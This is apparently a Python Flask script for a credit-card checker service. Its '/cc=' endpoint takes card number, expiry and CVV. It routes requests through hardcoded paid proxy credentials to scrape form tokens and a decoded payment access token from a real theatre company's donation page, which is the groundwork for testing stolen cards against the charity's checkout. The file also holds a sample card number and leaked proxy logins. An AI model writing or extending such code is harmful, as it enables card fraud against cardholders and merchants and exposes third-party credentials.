from flask import Flask, request, jsonify
import requests
import base64
import re

app = Flask(__name__)

# Quantum Proxy List
QUANTUM_PROXIES = [
    'http://Quantum-wn20la7van3ErYW9n:vb0ifitn@new.quantumproxies.net:10000',
    'http://Quantum-wn20la7van3ErYW9n:vb0ifitn@new.quantumproxies.net:10001',
    'http://Quantum-wn20la7van3ErYW9n:vb0ifitn@new.quantumproxies.net:10002',
    'http://Quantum-wn20la7van3ErYW9n:vb0ifitn@new.quantumproxies.net:10003',
    'http://Quantum-wn20la7van3ErYW9n:vb0ifitn@new.quantumproxies.net:10004',
    'http://Quantum-wn20la7van3ErYW9n:vb0ifitn@new.quantumproxies.net:10005',
    'http://Quantum-wn20la7van3ErYW9n:vb0ifitn@new.quantumproxies.net:10006',
    'http://Quantum-wn20la7van3ErYW9n:vb0ifitn@new.quantumproxies.net:10007',
    'http://Quantum-wn20la7van3ErYW9n:vb0ifitn@new.quantumproxies.net:10008',
    'http://Quantum-wn20la7van3ErYW9n:vb0ifitn@new.quantumproxies.net:10009'
]

# GET ENDPOINT - Tumhara URL yahan hit hoga
@app.route('/cc=<path:card_data>')
def process_card(card_data):
    try:
        # Card data parse karo
        card_parts = card_data.split('|')
        if len(card_parts) == 4:
            number, month, year, cvv = card_parts
            card_expiry = f"20{year}-{month}"
            
            # Quantum proxy use karo (first proxy)
            proxy_config = {
                'http': QUANTUM_PROXIES[0],
                'https': QUANTUM_PROXIES[0]
            }
            
            # Tumhara original code yahan aayega
            session = requests.session()
            
            headers = {
                'user-agent': 'Mozilla/5.0 (Linux; Android 15; V2312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            }

            # Proxy ke saath request
            response = session.get('https://atlanticcitytheatrecompany.com/donations/donate/', 
                                  headers=headers, proxies=proxy_config)

            # Tumhara extract code
            prefix_match = re.search(r'give-form-id-prefix" value="([^"]+)"', response.text)
            prefix = prefix_match.group(1) if prefix_match else None

            id_match = re.search(r'give-form-id" value="([^"]+)"', response.text)
            id = id_match.group(1) if id_match else None

            hash_match = re.search(r'give-form-hash" value="([^"]+)"', response.text)
            hash = hash_match.group(1) if hash_match else None

            enc_token_match = re.search(r"data-client-token\":\"(.*?)\"", response.text)
            if enc_token_match:
                enc = enc_token_match.group(1)
                dec = base64.b64decode(enc).decode('utf-8')
                acc_match = re.search(r"accessToken\":\"(.*?)\"", dec)
                acc = acc_match.group(1) if acc_match else None

            return jsonify({
                'status': 'success',
                'card': f'{number[:6]}******{number[-4:]}',
                'expiry': card_expiry,
                'cvv': cvv,
                'tokens_found': {
                    'prefix': prefix is not None,
                    'id': id is not None, 
                    'hash': hash is not None,
                    'access_token': acc is not None
                },
                'proxy_used': QUANTUM_PROXIES[0]
            })
            
        else:
            return jsonify({'error': 'Invalid card format. Use: /cc=number|month|year|cvv'}), 400
            
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# Health check
@app.route('/')
def home():
    return jsonify({'status': 'active', 'message': 'Use /cc=4106210008105223|01|2031|143'})

@app.route('/health')
def health():
    return jsonify({'status': 'active'})

if __name__ == '__main__':
    print("🚀 Server starting on http://localhost:8000")
    print("📍 GET Endpoint: /cc=4106210008105223|01|2031|143")
    print("🔒 Quantum Proxies: READY")
    app.run(host='0.0.0.0', port=8000, debug=True)
